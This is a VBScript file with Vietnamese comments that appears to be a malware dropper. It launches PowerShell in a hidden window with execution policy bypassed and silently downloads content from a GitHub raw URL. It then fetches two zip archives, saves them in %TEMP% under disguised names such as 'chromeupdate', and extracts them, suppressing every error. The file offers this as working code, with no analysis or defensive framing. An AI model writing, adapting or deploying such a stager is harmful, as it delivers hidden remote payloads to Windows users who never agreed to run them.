Option Explicit

'=============================
' KHAI BÁO BIẾN
'=============================
Dim shell, fso, http, stream
Dim scriptPath, scriptName, tempFolder, txtPath
Dim url1, url2, zip1, zip2, rawUrl

Set shell = CreateObject("WScript.Shell")
Set fso   = CreateObject("Scripting.FileSystemObject")

'=============================
' THIẾT LẬP ĐƯỜNG DẪN
'=============================
scriptPath = WScript.ScriptFullName
scriptName = fso.GetBaseName(scriptPath)
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%") & "\"
txtPath    = tempFolder & scriptName & ".txt"

'=============================
' URL NGUỒN DỮ LIỆU
'=============================
rawUrl = "https://raw.githubusercontent.com/f68g/us/refs/heads/main/content"
url1   = "https://raw.githubusercontent.com/f68g/us/refs/heads/main/pyv1.zip"
url2   = "https://raw.githubusercontent.com/f68g/us/refs/heads/main/pyv2.zip"
zip1   = tempFolder & "Updater247.zip"
zip2   = tempFolder & "chromeupdate.zip"

'=============================
' TẢI FILE TXT (CHỈ KHI CHƯA CÓ)
'=============================
If Not fso.FileExists(txtPath) Then
    shell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
        """(New-Object Net.WebClient).DownloadFile('" & rawUrl & "','" & txtPath & "')""", 0, True
End If

'=============================
' HÀM DOWNLOAD FILE (silent)
'=============================
Function DownloadFile(url, savePath)
    On Error Resume Next
    If fso.FileExists(savePath) Then
        DownloadFile = True
        Exit Function
    End If

    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", url, False
    http.Send

    If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1 ' Binary
        stream.Open
        stream.Write http.responseBody
        stream.SaveToFile savePath, 2
        stream.Close
        DownloadFile = True
    Else
        DownloadFile = False
    End If
    On Error GoTo 0
End Function

'=============================
' HÀM GIẢI NÉN ZIP (silent)
'=============================
Sub ExtractZip(zipPath, targetFolder)
    On Error Resume Next
    Dim shApp, zipFile, outFolder
    Set shApp = CreateObject("Shell.Application")

    ' Nếu thư mục đã tồn tại → bỏ qua
    If fso.FolderExists(targetFolder) Then Exit Sub

    Set zipFile   = shApp.Namespace(zipPath)
    Set outFolder = shApp.Namespace(targetFolder)

    If Not zipFile Is Nothing And Not outFolder Is Nothing Then
        fso.CreateFolder targetFolder
        outFolder.CopyHere zipFile.Items, 4 + 16
    End If
    On Error GoTo 0
End Sub

'=============================
' TẢI & GIẢI NÉN PYV1.ZIP
'=============================
If DownloadFile(url1, zip1) Then
    ExtractZip zip1, tempFolder & "Updater247"
End If

'=============================
' TẢI & GIẢI NÉN PYV2.ZIP
'=============================
If DownloadFile(url2, zip2) Then
    ExtractZip zip2, tempFolder & "chromeupdate"
End If
